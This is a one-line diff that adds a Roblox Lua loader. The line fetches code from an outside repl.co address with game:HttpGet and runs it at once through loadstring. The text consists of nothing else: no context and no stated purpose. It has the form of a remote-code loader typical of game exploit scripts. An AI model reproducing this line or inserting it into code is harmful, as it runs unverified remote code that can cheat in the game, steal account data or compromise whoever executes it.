@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://76549.jmuse.repl.co/", true))()
